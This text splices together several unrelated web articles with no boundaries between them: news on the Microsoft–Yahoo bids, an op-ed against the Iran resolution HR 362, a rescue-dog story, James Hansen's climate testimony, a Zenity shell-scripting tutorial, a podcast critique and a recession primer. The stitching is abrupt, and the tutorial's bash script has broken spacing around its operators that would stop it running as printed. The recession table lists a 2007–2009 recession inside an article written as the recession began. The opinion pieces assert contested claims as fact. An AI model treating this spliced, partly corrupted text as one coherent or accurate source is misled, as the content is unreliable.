A deal would value AOL at $ 10 billion , with Time Warner kicking in some cash in exchange for 20 percent of the combined unit .
Yahoo plans to use the cash and other funds to buy back several - billion dollars in stock at a price near the middle of a range between $ 30 to $ 40 a share , a source familiar with the plans said on Thursday .
“ The structure of the AOL deal is likely to be less appealing to Yahoo shareholders than the straight - forward Microsoft bid , ” Jefferies & Co analyst Youssef Squali said .
“ We believe that a ‘ clean ’ acquisition of Yahoo by Microsoft is still the most likely scenario . ”
UBS analyst Heather Bellini agreed that Yahoo management would have a difficult time convincing its shareholders that its alternative deal was worth more than Microsoft ’s offer .
“ Even if shares were repurchased at $ 35 - plus a share , the shares likely would pull back once the buyback is done , ” Bellini wrote in a report .

ANTITRUST SCRUTINY
A joint Microsoft - News Corp bid could create a more formidable competitor to Google by uniting three of the biggest Web site publishers : Yahoo , Microsoft ’s MSN and News Corp ’s MySpace social network .
Bellini noted that while a tie - up could make sense by lowering Microsoft ’s financial risk , there would be an increased risk over integration .
Google is seen out of the running for buying Yahoo outright , due to antitrust concerns .
However , Yahoo’s two - week test of Google ’s search advertising technology could lead to a broader deal .

Citigroup analysts Mark Mahaney and Brent
Thill estimated a full search outsourcing deal could generate more than $ 1 billion in cash flow to Yahoo , though they also say a Microsoft deal is the “ most likely outcome . ”
Antitrust lawyer Evan Stewart , of Zuckerman Spaeder LLP , said a tie - up between Google and Yahoo would raise eyebrows , even if the deal was not a formal merger .
He called the U.S. Justice Department an 800 - pound gorilla with the power to investigate any deal it found troubling .
“ If Yahoo were to be swallowed up by Google , even a sleeping 800 - pound gorilla would wake up to that , ” Stewart said .
Any of the potential mergers would fundamentally change business on the Web as growth slows dramatically after an explosive decade .
Talks with News Corp , which earlier had discussed working with Yahoo as a counter to Microsoft , are at a sensitive stage , The New York Times said .
The Wall Street Journal called those talks “ serious . ”
News Corp shares edged down 0.3 percent to $ 18.89 , and Time Warner shares rose 1.3 percent to $ 14.61 .
Google rose more than 1 percent to $ 469.08 .
Microsoft , News Corp , Time Warner , Google and Yahoo have all declined to comment on the talks .
Finally , we can all agree on something : the Air Force wants a holodeck .
I want a holodeck .
You want a holodeck .
Luckily for us , the Air Force is a good party to have overlapping interests with , technology wise ; they have the billions to do it , and according to a recent request for proposals , are now getting serious .
Specifically , they want " petabyte command and control databases [ that can ] be visualized and controlled dynamically in 3 - D , " and they do n't want it to suck .
Namely , they want said holographic system to be bright , huge , have a great interactive interface , and be visible in 3 - D with the naked eye .
Watching a little too much TNG , guys ?
Noah at Danger Room compiles a few sources that say a lot of the holographic optics tech is n't that far off , surprisingly .

The current tension among political observers as to whether the U.S. and / or Israel will undertake military action against Iran before president Bush leaves office has been greatly intensified by the prospect that Congress will pass a frightening resolution , HR 362 , as early as this week .
The Demands of HR 362
HR 362 , sponsored by Rep. Gary Ackerman , a New York Democrat , calls for the president to enact more draconian economic sanctions against Iran .
These include an embargo against any imports of refined petroleum .
( While Iran is of course a major exporter of oil , it imports at least 40 % of its refined petroleum . )
The wording of the Resolution is chilling in the extreme : " Congress ... demands that the President initiate an international effort to immediately and dramatically increase the economic , political and diplomatic pressure on Iran to verifiably suspend its nuclear enrichment activities by ... prohibiting the export to Iran of all refined petroleum products ; imposing stringent inspection requirements on all persons , vehicles , ships , planes , trains , and cargo entering or departing Iran ; and prohibiting the international movement of all Iranian officials not involved in negotiating the suspension of Iran 's nuclear program . "
The resolution is moving quickly through the House and could pass as early as this week .
The " stringent inspection requirements " listed would require a naval blockade , thereby constituting an act of war .
And this is how the resolution would be perceived by virtually all Iranians .
The result would surely marginalize moderates in Iran who would shun retaliatory measures against the Bush administration 's aggressive rhetoric , which has been escalating since fall of 2007 .
Iranians would unify behind their most belligerent leaders and the country would have been handed , by the president and Congress , powerful reasons to develop nuclear weapons for purposes of deterrence .
The final clause of the Resolution contains a classic example of political doubletalk : " ... nothing in this Resolution shall be construed as an authorization of the use of force against Iran . "
But an embargo - with - inspections scheme can be put in effect only by means of a blockade , which logically entails the use of force .
Congressional Democrats , the IAEA and Factual Falsehoods in HR 362
There is more support now than there was a year ago in Congress , especially among the Democrats , for military action against Iran .
Thus HR 362's co-sponsors include 96 House Democrats and 111 House Republicans .
These are the same Democrats whom Americans voted into Congress , in November 2006 , as majorities in both houses , based on what voters believed to be the Democrats ' opposition to war in the Middle East .
To add insult to injury , HR 362 justifies its content with demonstrably false accusations about Iran 's nuclear program .
The Resolution charges that Iran 's importing and manufacturing of centrifuges are " covert " and " illicit . "
But under both the Nuclear Nonproliferation Treaty , to which Iran is a signatory , and Iran 's agreements with the U.N. 's nuclear watchdog , the International Atomic Energy Agency ( IAEA ) , these activities are entirely permitted .
The IAEA has publicly stated its support of Iran 's uranium enrichment program , which it states is in full accord with all treaty requirements to which Iran is subject .
Late last October IAEA chief Mohamed ElBaradei remarked to CNN : " Have we seen Iran having the nuclear material that can be readily used into a weapon ?
No .
Have we seen an active weaponization program ?
No. ... I very much have concern building confrontation , because that would lead to a disaster .
I see no military solution .
The only durable solution is through negotiations and inspections .
My fear is that if we continue to escalate from both sides that we would end up on a precipice , we would end up in an abyss . "
ElBaradei's most recent statements repeatedly echo these October remarks .
The Role of AIPAC
That HR 362 has been so warmly received on Capitol Hill is a sad testimony to Congress 's willing dependence on external interests which cannot be assumed to be identical to those of most Americans .
The Resolution is known to have been initially drafted by the American - Israeli lobby AIPAC .
In early June AIPAC sent more than a thousand lobbyists to Congress to whip up support for this Resolution .

Congress 's well known subordination to AIPAC 's agenda should not be construed as a democratic response to the wishes of the American Jewish community .
Polls show that more than 80 % of Jewish - Americans oppose an attack on Iran .
Congress 's compliance to AIPAC 's interests amounts to obeisance to a foreign State , not to any domestic constituency .
HR 362 and the Pre-Invasion Rhetoric Re Iraq : Preludes to War
Reminiscent of Bill Clinton 's decision to impose severe extensive sanctions against Iraq , the White House last October unilaterally imposed harsh economic sanctions against a number of important Iranian institutions .
In addition to targeting more than 20 Iranian companies and the country 's 3 major banks , the sanctions were announced as aimed mainly at Iran 's uniformed security force , the Revolutionary Guard Corps ( RGC ) , which the Bush administration characterized , with no evidence , as " proliferators of weapons of mass destruction " and RGC's Quds Force , which has been branded as a " supporter of terrorism . "
These two accusations were the main pretexts for the invasion of Iraq .
Since Quds is part of RGC , and the latter is a state institution , the branding of Quds as a terrorist organization was ipso facto to brand Iran as a terrorist state .
Just as Washington had earlier cooperated with Saddam Hussein in his war against Iran ( by providing him with , among other things , chemical weapons ) , so too had Washington benefited from Quds 's provision of arms to the U.S. - backed Muslim government in Bosnia , its aiding the forces fighting the Soviet military in Afghanistan , and its support for those fighting the Taliban .
Quds even assisted , with U.S. approval , Kurdish guerrillas ' assault on the Baathist regime of Saddam .
The demonization of former allies has been common to Washington 's war preparations against both Iraq and Iran .
In both cases perhaps the principal objectives have been to shut down the possibilities for a negotiated settlement , and to provide a " legal " framework for war by specifying the pretexts of weapons of mass destruction and terrorism .
The Democrats ' overwhelming support for the 2003 invasion of Iraq is well known .
Their legislation prior to the October 2007 sanctions is perhaps less well remembered .
Shortly before Secretary Condoleezza Rice and Treasury Secretary Henry Paulson announced the October sanctions , the Democratic - led house passed legislation that would impose sanctions on non-U.S. energy companies doing business in Iran .
The legislation passed by an overwhelming 397 - 16 vote .
Democratic leaders justified this legislation as cutting off funding for Iran 's ( entirely legal ) nuclear program .
But the legislation was surely motivated in large part by the intention to eliminate any competitive advantage that might be enjoyed by competitors of U.S. oil companies , which no longer have access to Iran - based profits .
HR 362 is a major extension of the October sanctions .
The latter were intended to deal a damaging blow to Iran 's economy .
The RGC is not merely a military institution .
It performs a broad range of economic activities .
Its engineering unit includes among its major projects a $ 2 billion dollar contract to develop Iran 's main gas field , a $ 1.3 billion contract for a new pipeline to Pakistan , the construction of a Tehran metro extension , a high - speed rail link connecting the capital and Isfahan , the expansion of shipping ports and the construction of a major dam .
The October sanctions are known to have already had a significant impact on Iran 's economy .
HR 362 is intended to intensify that damage , to take negotiations off the table , to provoke Iranian hard - liners .
Its passage would constitute another giant step toward what Mohamed ElBaradei called " an abyss . "

An eight - year - old dog has touched the hearts of Argentines by saving the life of an abandoned baby , placing him safely alongside her own new puppies .
The country 's media are calling him " the miracle baby " .
He was born prematurely to a 14 - year - old girl in a shanty town outside the capital , Buenos Aires .
She is said to have panicked and abandoned the boy in a field , surrounded by wooden boxes and rubbish .
Then along came La China , reports say , the dog which somehow picked up the baby and carried him 50 m to place him alongside her own puppies .
The dog's owner reported hearing the child crying and finding him covered with a rag .
The baby , weighing 4 kg ( 8lb 13oz ) , had some slight injuries , but no bite marks .
Owner 's concern
The owner called the police and the child is now being looked after by the authorities , while a decision is taken about his future .
The frightened mother appeared shortly after her baby was found .
The Argentine media has descended on the shanty town , talking of " the Argentine Romulus and Remus " , the legendary founders of Rome , abandoned as babies and rescued by a wolf , nearly 3,000 years ago .
La China , worried about her own puppies , is reported to be petrified by her new found fame , and her owner says he is worried that she is not eating .
US scientist calls for prosecution of energy company CEOs for global warming disinformation
By Shannon Jones
26 June 2008
In testimony before the US Congress on Monday , James Hansen , a leading climatologist , called heads of major energy companies criminals who should be prosecuted for deliberately spreading false and misleading information about the threat posed by global warming .
Hansen , director of NASA ’s Goddard Institute for Space Studies ( GISS ) , testified before the House Select Committee on Energy Independence and Global Warming to mark the 20th anniversary of his initial appearance before Congress in 1988 .
He generated the first significant public awareness of the issue of global warming by telling the Senate at that time that manmade greenhouse gasses were raising global temperatures .
Since then climate scientists have reached a virtually unanimous consensus that the burning of oil and other fossil fuels results in additional atmospheric carbon dioxide , trapping heat .
The amount of carbon dioxide in the atmosphere has increased greatly over the last century , and global temperatures are rising as a result .
“ We have reached a point of planetary emergency , ” Hansen told the Congressional panel Monday , saying the world was near a “ tipping point ” where climate change “ would spiral dynamically out of humanity ’s control . ”
He compared the role of Exxon Mobil and other energy conglomerates , which have attempted to stoke doubts on scientific findings related to global warming , to the role of tobacco companies that denied the dangers of smoking .
“ CEOs of fossil energy companies know what they are doing and are aware of the long - term consequences of continued business as usual .
In my opinion , these CEOs should be tried for high crimes against humanity and nature . ”
Hansen warned , “ Elements of a ‘ perfect storm , ’ a global cataclysm , are assembled . ”
He said that the climate could reach a point “ that amplifying feedbacks spur large rapid changes . ”
He cited the melting of Arctic sea ice as one example .
An even greater catastrophe looms with the melting of Antarctic and Greenland ice sheet , which would raise global sea levels at least two meters .
“ Hundreds of millions of people would become refugees , ” he said .
Global warming will lead to the extinction of species , the spread of arid regions , stronger floods , droughts , forest fires and the drying up of lakes unless it is halted , he continued .
Hansen decried the extremely limited official goals set for reducing carbon emissions calling them “ a recipe for global disaster . ”
He called for a moratorium on the construction of coal burning power plants and the development of carbon free alternatives to coal and petroleum .
Hansen indicted the energy conglomerates for blocking action on global warming .
“ Instead of moving heavily into renewable energies , fossil fuel companies choose to spread doubt about global warming , just as tobacco companies discredited the link between smoking and cancer .
Methods are sophisticated , including funding to help shape school textbook discussions about global warming . ”
He also denounced the fossil fuel industry for using “ China and other developing nations as scapegoats to rationalize inaction . ”
The media paid very limited attention to Hansen ’s remarks , particularly his attacks on the energy companies .
The New York Times in its report on his testimony managed to not even mention the NASA scientist ’s criticisms of the oil industry .
House Democrats greeted Hansen ’s testimony with patronizing condescension .
Predictably they chose to ignore his call for the prosecution of energy company executives , who annually pour millions of dollars into the campaign coffers of both parties .
Since Hansen issued his first warning in 1988 , the US , which is responsible for about one - quarter of the world ’s greenhouse gas production , has done nothing to limit carbon emissions .
The Bush administration , in alliance with the oil industry , has sought to play down the scientific evidence in support of global warming .
Last year Hansen testified before another congressional committee about Bush administration interference in climate research , recounting instances of government suppression of data related to global warming .
In one case a staff member was told he could not issue a press release on research showing that the ocean was less efficient in removing carbon dioxide from the atmosphere than originally estimated .
In 2005 , after Hansen presented climate data to the American Geophysical Union , the NASA public affairs office issued tighter regulations , stipulating that media interviews had to be pre-approved and that Hansen had to get prior permission before posting anything on the GISS website .
Other government scientists have reported similar attempts by the Bush administration to muzzle data on global warming .
Documents support the claims of scientists that the White House made deliberate attempts to mislead the public about the dangers posed by climate change by editing official reports .
Oil company representatives have been given positions on federal environmental policy councils and climate information oversight .
The White House appointed Phil Cooney , a former lobbyist for the American Petroleum Institute , to head the Council of Environmental Quality .
In that position he edited government climate reports in order to spread false doubt and uncertainty on the subject of global warming .
After his activities were exposed , Clooney left his government post for a position with Exxon Mobil .
The attempts by Exxon Mobil to discredit the scientific understanding about climate change on the basis of pseudoscience are well documented .
A conservative think tank sponsored by Exxon Mobil offered scientists $ 10,000 to write articles critical of official studies on climate change .
The world ’s largest private energy company has spent millions of dollars to spread false and misleading information about the dangers of global warming .
According to a report issued by the Union of Concerned Scientists in January 2007 , Exxon Mobil gave nearly $ 16 million between 1998 and 2005 to front organizations set up to provide a platform for “ global warming skeptics . ”
In many cases these individuals are directly on the payroll of Exxon Mobil funded groups .
Despite Hansen ’s compelling testimony , there are no indications that US policy will change .
Since Hansen first appeared before Congress in 1988 , neither the Clinton administration nor the administrations of George H.W. Bush and George W. Bush have passed any major legislation restricting greenhouse gas emissions .
There have been 21 coal - fired power plants constructed and US emissions of carbon dioxide have risen by some 18 percent .
The domination of the energy sector by a handful of private monopolies and the subordination of both the Republicans and Democrats to these powerful interests blocks the adoption of any serious measures to deal with the looming catastrophe posed by global warming .
These multibillion dollar corporations will not tolerate any measure , no matter how critical for human survival , that impinges on their profits .
Further , any strategy to oppose global warming requires a coordinated international effort .
However , energy companies dominate US foreign policy as well , dictating a strategy that seeks to secure world hegemony , including the invasion and occupation of Iraq and other oil rich regions of the world .
The first time I played with Zenity , I recognized several potential uses for it .
While I 'm pretty comfortable with interacting with computers with a command line interface , I know many people are not .
Zenity creates GUI widgets from a simple command line and can be used from any shell script .
This allows an Administrator to write a shell script that performs a given function but make the program easy for less sophisticated users to interact with .
There are many times when you need to perform a repetitive task but you do n't want to expose your users to the shell prompt .
As much as I do n't like having to point at things with a mouse in order to get a computer to do what I want , I understand that sometimes , using a GUI can reduce the chance of making a simple mistake .
For example , if a program needs the user to enter a date , does it want the date in YYYY - MM - DD format , or MM - DD - YY format ?
Your program could tell the user how it expects the date , , but why make things more complicated than they need to be ?
Why not simply let the user select the date from an interface they are familiar with , a calendar ?
When was the last time you mistyped a long filename that that had mixed upper and lower case characters ?
Obviously , it would be easier to point and click on the filename instead .
With Zenity , your program can display calendar , file selection , text input and text message widgets .
The results of the user 's interaction with these widgets are then available to the shell script .
Let 's take a look at a few simple examples before moving on to the real world example .
The following command will present the user with a calendar with “ Example 1 ” in the title bar and the text , “ When is your birthday ? ” at the top of the window .
When the user selects a date , Zenity prints the selected date to STDOUT , which is then assigned to the variable , birthday .
export birthday=`zenity -- calendar -- text =' When is your
birthday ? ' -- title= ' Example 1'`
Users have learned what an error window means without even having to read the text and Zenity allows your scripts to give intuitive error indications .
Simply use a command such as this .
zenity -- error -- text ='Something very bad has happened !' -- title= ' Example 2 '
As you can see , Zenity is pretty easy to use .
You simply tell it which widget you want it to display and then customize that widget using various other parameters .
Then you can accept the results , if any , by reading Zenity 's STDOUT .
Let 's consider a hypothetical situation that arises quite often in business .
You perform daily backups of your user 's home directories and they frequently delete files and need you to recover them from backup .
The problem is that you do n't want to be bothered with simple tasks like that , but you do n't want to have to train all your users to perform their own file recovery .
Instead , like most Linux Administrators , you write a script .
Here is a quick script I wrote as an example of a backup file recovery program .
#!/bin/bash
export repository = " /tmp/backups "
export user=`whoami`
#############
Step 1 #########################
zenity -- info -- title= " File Recovery Program " -- text =
" You are about to be
asked for the date of the backup file you wish to recover from .
Select the
date to continue . "
#############
Step 2 #########################
export date=`zenity -- calendar -- date - format=%Y-%m-%d`
if [ ! -f $ {repository}/${user}/${date}.tgz ] ; then
echo
No such file $ {repository} / ${user}/${date}.tgz
zenity -- error -- text = " I \'m sorry , the backup for $ date was n\'t
found . "
exit ;
fi
#############
Step 3 #########################
export files=`tar - tzf $ {repository}/${user}/${date}.tgz |
zenity -- list - - title " Select the files to
recover " -- column " Files " -- separator= " " -- multiple`
#############
Step 4 #########################
zenity -- info -- title= " File Recovery Program " -- text = " Next , you must select
which directory to recover your files to "
export target_dir=`zenity -- file - selection -- directory`
#############
Step 5 #########################
zenity -- info -- title= " File Recovery Program " -- text =
" If you would like , I can
create a new directory for your recovered files to be saved to .
If you would
like this , enter the name of the new directory next .
Otherwise , just click on
OK "
export dir=`zenity -- entry -- title= " File Recovery Program " `
#############
Step 6 #########################
if [ -f $ {target_dir} / $ {dir} ] ; then
zenity -- error -- text = " I can not create a directory named
$ {target_dir} /
$ {dir} because there is a file with the same name already there "
exit
fi
if [ ! -d $ {target_dir} / ${dir} ] ; then
mkdir $ {target_dir} /${dir}
fi
#############
Step 7 #########################
tar - xzvf $ {repository} / ${user}/${date}.tgz - C $ {target_dir} / $ {dir} / $ files |
zenity -- progress –pulsate
zenity -- info -- title= " File Recovery Program " -- text =
" File recovery complete . "
I 've broken the script into 7 parts to make it easier to discuss what each part of the script does .
The script starts by defining a few important variables .
Since this is a fictional scenario , I defined by backup repository to be in / tmp / backups ; you 'd probably put your backups elsewhere .
Then we start step one of the user dialog .
Step one is pretty intuitive .
It simply tells the user what to expect from the next dialog .
When the user clicks on the OK button , we go to step tow and the user is presented with a calendar .
The user picks the date from which to recover the lost files .
The program line that displays the calendar uses a format string to tell Zenity how to format the resulting date .
I wanted the date to be in a sortable format , so I chose YYYY - MM - DD .
I replaced the default slash character with simple dashes because otherwise , the shell would think YYYY / MM / DD referred to 3 directory levels , when we really want it to mean a single filename .
The format string is exactly like those used in date ( 1 ) .
Step 2 then checks to see if the backup file actually exists .
If it does not , then it displays an error message and terminates .
Otherwise , we continue to the next step in the script .
In step 3 , we send the output of the tar command to Zenity so that our user can select which files they want to restore from the tarball .
We use the -- multiple parameter so that they can select more than one file to recover .
Also notice that we set the -- separator to a single space .
By doing this , we cause Zenity to produce a list of filenames for recovery and we can use that list as a single variable substitution on the command line .
Next we want to give the user the chance to restore their files to a directory other than their current working directory .
We use the -- file - selection widget for this purpose .
By using the -- directory parameter , we restrict the user to only being able to select directories , not files .
In step 5 , we tell the user that the program can create a subdirectory in the directory they just selected and all of the recovered files will go into that subdirectory .
Then we use the -- enter widget to let the user tell us what subdirectory to create .
If the user presses the OK button without entering anything , our script will simply restore the files into the selected directory .
In step 6 , we do some error checking to make sure there is n't already a file with the same name as the subdirectory the user entered .
If there is , we give the user an error message and our program terminates .
Then we make the subdirectory if it does n't already exist .
Finally , in step 7 , we recover the user 's files from the selected tarball and place them in the appropriate directory , while giving the user visual feedback in the form of a progress bar .
This way , our user does n't need to guess if the program is working , and they are n't confronted with a list of filenames , or even worse , error messages .
As you can see , Zenity makes it very easy to write shell scripts that interact with the user via the GUI .
Admittedly , this example was a little contrived .
The example was meant to be rich enough to demonstrate as many of Zenity 's features as possible while still appealing to practicality .
It would n't take many changes to have the recover script use ssh and scp to access a remote backup repository , perhaps at a remote location .
The user would n't have to know any of the details since all they ever see is a nice user - friendly series of dialog boxes .
Most Linux Administrators are comfortable with the command line interface and many might think that using Zenity to “ dumb - up ” a simple shell script is a waste of time .
However many Linux Users are n't as proficient with the shell interface and will appreciate your efforts to make their work as “ point and click ” as possible .
I 've been listening to Nice White Parents .
First of all , it 's wild to hear so much reporting about something I 've spent so much time inside -- I was a parent at an integrated charter school less than a mile from IS 293 , I visited around 20 schools in the neighborhood , and I also worked as a substitute teacher in schools in the neighborhood .
I also worked for several years teaching math and college counseling with mostly black high school students from nearby Bed -Stuy .
There 's much in the show that I recognize and appreciate .
And , I think the show has a tendency to fall into progressive assumptions and simplifications that make the answers look easier than they really are .
One thing that rankles me is the way the show vaguely references white parents getting more " resources " than parents of color .
( Or " hoarding resources " . )
For all the reporting they 've done , they have n't really identified significant funding gaps between white students and students of color .
But it seems like if those gaps were there , the show would be talking about them .
Does this omission matter ?
I would argue that it 's indicative of a shell game that the series is playing .
When an opportunity arises to show an imbalance of resources -- say , the fundraising for the French dual language program that is n't shared with the broader school -- the show pounces , and summarizes the trend in phrases like " hoarding resources " .
But contrary evidence is either skipped over or never explored .
Is there a difference in effective per pupil expenditure for white students in Brooklyn public schools , vs students of color ?
If so , that seems like it would hugely support the show 's thesis .
But they either never found out , or never thought to try , or perhaps they looked into it and the answer did n't fit their thesis .
In another example , consider the effect on resources of a white student 's parents sending them to private school .
The city does n't give a refund to families for not using the public school system ; to opt out of it is effectively to contribute significant resources .
It may seem like a stretch to look at the effect of these parents ' decisions on funding this way , but is it as much of a stretch as describing the overall situation as white parents " hoarding resources " ?
Another gripe is that there is so little credence given to the legitimacy of a school being " bad " .
Early on they interview one white parent who says she did n't send her kid to a school because it seemed like the kids were misbehaving , not listening , and chaotic .
The host points out that these perceptions can be colored by racism , which is absolutely true .
But they are also perfectly real and valid .
The host mentions sending her child to their " zoned " Brooklyn public school , which she describes as integrated -- in other words , she lives in an expensive gentrified neighborhood .
( Many or most white parents in that part of Brooklyn send their kids to a school outside their " zone " -- I 'm going to say the odds that she considered that are 99 % . )
I 'm guessing that here are dozens of schools near to her that have few white students .
It would serve the overall quality of education much better for her to send her child to one of those schools , but she instead chose a more white and upper middle class school .
Why did n't she ?
Why does n't she talk about that ?
I also think the show fudges aspects of the intersection of race and class in gentrified Brooklyn .
The show mentions " the projects " a few times , but what people not familiar with NYC might not understand is that in neighborhoods such as IS 293's Gowanus , the gap between the income of a random black person and random white person is much higher than it is nationally .
In other words , even more so than the main as a whole , in these neighborhoods , segregation is more economic than racial .
That 's not to excuse it , at all .
But I know many middle class and upper middle class black parents in Brooklyn who advocate , shop around , and fundraise much like the white parents the show focuses on .
They also avoid nearby public schools where the students ' families are overwhelmingly poor , and they do n't do that because they are racist .
How much would it have depend the show 's portrait of the situation -- and undercut its confrontative thesis -- to include them in the picture ?
And , conversely , to exclude them ?
These may be nitpicks , but I was very disappointed by the series .
I think there are truly difficult problems in education and that integration is vital -- we sent our kids to one of the most integrated publicly funded schools in Brooklyn , and they rode the school bus every day as the only white kids on the bus .
From everything I 've seen , the problems that the show identifies are real .
The system , as it plays out , is n't fair .
But the show does n't seem serious about trying to understand the way the system works , and instead prefers a progressive fantasy that there 's " one weird trick " -- white parents not being so racist -- that would meaningfully solve things .
Some schools really are more chaotic or dangerous than others , and this is n't just the racist perception of white visitors -- teachers , parents and students are asked about this , and the numbers are reported .
Some schools really do n't notice if teachers are n't teaching , and kids are n't learning .
I 've been on a scheduled school tour in Brooklyn public schools when the school staffer leading parents around realizes , in a shock , that a teacher is asleep at her desk with a class full of students .
I 've been on a scheduled school tour ( at a different Brooklyn pubic school ) when the school staffer leading parents around realizes , in a shock , that none of the classrooms have students in the because practically the whole school is watching Monsters , Inc. in the auditorium .
I 've been in New York public schools where teachers turn on Netflix , to occupy second graders with Spongebob because they have nothing else to do .
I 've spoken to a Brooklyn pubic school principal , during a school tour , and heard her make half a dozen grammar mistakes in just a few minutes of conversation .
Critics such as Diane Ravitch insist that claims that public schools are failing are nothing more than propaganda .
Other critics cite the need to replace equality of service with equity of outcome in our apportionment of resources .
I have sympathy for those arguments .
But it 's significant that these philosophical arguments seldom come with a frank description of the reality on the ground in New York 's public schools , as I 've seen them .
It 's as though the real problems are too hard to even begin to address , and so clever critics have come up with more attractive and intriguing problems to replace them - - a sort of Malcolm Gladwellification of the school reform issue .
This is bad for many reasons , but most of all because systemic racism is very real , and very destructive .
Systemic racism does n't care that you have come up with a clever reframing of the problems facing education equity .
Systemic racism laughs at the parent , who chose not to send their kid to the school that needed their family 's involvement the most , and who wags their finger at another parent for doing the same .
Systemic racism knows it can let black and Latin kids watch cartoons in school on a regular basis , and there 's no chance that will get mentioned in progressive media because it sounds like something a conservative might say .
What do I think would solve things ?
I think you need to start by acknowledging that professional parents , of all races , often put necessary pressure on schools to improve ; and by acknowledging that it is rational for involved parents to choose schools based on a combination of perceived quality , transportation convenience , and societal goals like racial integration .
The " pressure " piece is huge , and I think Nice White Parents misses the implications of its own reporting .
There needs to be more pressure applied from professional parents , not less .
I agree with the show that parent choice allows more active and informed parents to collect in a small number of schools ; a goal should be to distribute them among more schools , while not incentivizing them too much to leave the district , the city , or the public school system .
This distribution is also important because advocating for your school to improve takes a lot of real labor .
Parents who would be willing to be one of , say , a dozen active families working on replacing an abusive teacher or an incompetent principal , will balk at being one of , say , three .
I 've seen this multiple times ; parents have told me that they worked for years to improve their kid 's public school , but finally gave up and moved to a different neighborhood .
As I 've argued with Nicole Hannah - Jones , this is fundamentally a collective - action problem , more than a problem with the values that individual parents are applying .
That means it needs a collective - action solution , like assigning families to a school that may not be the nearest school to them -- AKA " busing " .
Currently in Brooklyn , there are school " zones " within school " districts " .
Everyone is assigned a zone based on their home address , and that essentially guarantees their children entry into the zoned school .
A school " district " may contain two dozen " zones " , and parents who send their kids outside their zone get preference within the district , over parents from outside the district .
The zones and districts seem to be to primarily function to help real estate buyers see the schooling implications of a location .
Needless to say , this fuels housing segregation .
They should be done away with entirely .
Instead , the NYC Department of Education should assign parents to one school , and give them a small cash incentive to go there .
The assignment can be chosen to emphasize racial and economic integration , while also staying reasonable about transportation .
Parents can send their kids to other schools if they prefer , but there would n't be a preference for schools near them , and they would n't get the cash .
If professional parents know that dozens of other professional parents are also being assigned to the school , they will consider it , even if it is day from their first choice .
And poor parents who do n't know as much about how to work the system , and who would prefer a closer school , will be more willing and able to send their kids to a " better " school in a different neighborhood , having been assigned the school and knowing that other people near them will be going to .
The cash incentive would help everyone stick to the system , while still allowing parents to get their kid out of a school that 's a bad match for them , or to keep them with extended family .
Key to this working would be transportation .
The DOE 's system of buses is antiquated and underfunded ; the buses are too large to navigate city streets quickly , and there is too much car traffic .
There needs to be a citywide fee system for cars , and higher taxes on Uber .
Every family with kids in the school system should get a student unlimited MetroCard , plus one adult 20x / month MetroCard for accompanying them .
And every family should be guaranteed school bus service that will take no more than 1 hour each way , so long as they attend their assigned school .
One thing that Nice White Parents gets right is how difficult a political sell this sort of integration policy would be to parents .
For how much the system is failing , people still seem to prefer their neighborhood schools .
Many white parents would resist , though I think there would be much more than racism fueling their resistance .
Many parents of color would resist , too .
But consider that there would be little taken away from parents -- just the guarantee of admission to their zoned school .
It would be worth it , and , I think , ultimately could become a popular policy .
Integration is really , truly crucial , but I think it can only be achieved by facing how the system actually works now , not by hiding our heads in the sand and repeating fairy tales .

Recessions and the State of Our Economy : A Visual Primer
When there ’s smoke , there ’s fire .
The latest unemployment numbers are finally pointing to something we ’ve been suspecting all along : that we ’re now in the midst of a recession .
But for those folks out there who are n’t thoroughly convinced , or who would like to become acquainted with the topic of recessions — after all , this is something that may have some influence on our spending and saving habits in the near term —
I ’d like to present this FAQ on recessions .
So let ’s get to know our personal finance ’s public enemy # 1 … 😉
Signs and Predictors of a Recession
What are the symptoms of a recession ?
Here are some of the signs that the recession is finally here :
three sequential months of job losses
the largest number of job losses in 5 years occurred in March 2008
the national unemployment rate rose from 4.8 percent to 5.1 percent
increase in mortgage defaults due to subprime loans
financial institutions are in near collapse ( Bear Stearns ? )
foreclosure spikes nation - wide
stock market down from previous highs
Definition of a Recession
Though it may sound like the end is nigh when the media starts to freely promote the notion that we ’re finally in the thick of an economic storm ( but really just the trough of an economic cycle ) , you may want to put things in perspective .
A recession is part of a normal economic cycle and is defined as follows :
According to the National Bureau of Economic Research , or NBER , a recession can be defined as “ a significant decline in economic activity spread across the economy , lasting more than a few months , normally visible in real GDP ( gross domestic product ) , real income , employment , industrial production and wholesale - retail sales . ”
While other sources officially describe it as “ a decline in a country ’s gross domestic product ( GDP ) , or negative real economic growth , for two or more successive quarters for a year . ”
The determination of a recession is typically delayed , and identified only after some months have past where weakness has been tracked and recognized on various economic fronts and in market indicators .
It may not be so bad when you know it ’s just temporary .
Or when you realize it ’s already happening way after it ’s already started .
Or maybe it ’s not so bad because you happen to be lucky enough to live and work in a recession - proof locale .
Or we could just be lulled into a false sense of security since the last couple of recessions we ’ve had have n’t been painful enough to be truly memorable .
It is worth noting though , that recessions have been shorter and shallower than they ’ve typically been way back in history .
Following are some interesting tables and charts depicting the history of recessions in the United States .
History of Recessions
This table from CNBC shows us a history of recessions :
Recessions of the 20th Century Date Duration ( in Months ) Sept. 1902 - Aug. 1904 23 May 1907 - June 1908 13 Jan. 1910 - Jan. 1912 24 Jan. 1913 - Dec. 1914 23 Aug. 1918 - March 1919 7 Jan. 1920 - July 1921 18 May 1923 - July 1924 14 Oct. 1926 - Nov. 1927 13 Aug. 1929 - March 1933 43 May 1937 - June 1938 13 Feb. 1945 - Oct. 1945 8 Nov. 1948 - Oct. 1949 11 July 1953 - May 1954 10 Aug. 1957 - April 1958 8 April 1960 - Feb. 1961 10 Dec. 1969 - Nov. 1970 11 Nov. 1973 - March 1975 16 Jan. 1980 - July 1980 6 July 1981 - Nov. 1982 16 July 1990 - March 1991 8 March 2001 - Nov. 2001 8 December 2007 – June 2009 18 source : NBER
As you ’ll see , the last couple of decades have yielded some pretty tame recessions that have lasted us only 8 months each .
Will this current one be any different ?
Many say we ’re due to return to “ normal or average recession standards ” .
For clarity , this is how recessions are classified or characterized :
A “ mild ” recession is one whose duration is less than 10 months and which results in small declines in jobs , retail sales , output and real GDP .
An “ average ” recession typically persists for 11 months with more moderate declines in the jobs , sales , output , real GDP and interest rates .
While a “ severe ” recession is known to last for 16 months , with economic indicators experiencing more dramatic drops .
Should we then expect a longer down period ?
Given the causes and triggers of this downtrend , and the general difficult financial landscape our nation is facing , it may not be surprising to see a more protracted contraction this time around .
How The Economic Cycle and The Stock Market Are Linked
All this recession talk is of course , fascinating , but as investors , I ’m sure you ’d be more interested in finding out how recessions affect the stock market and consequently , your portfolios .
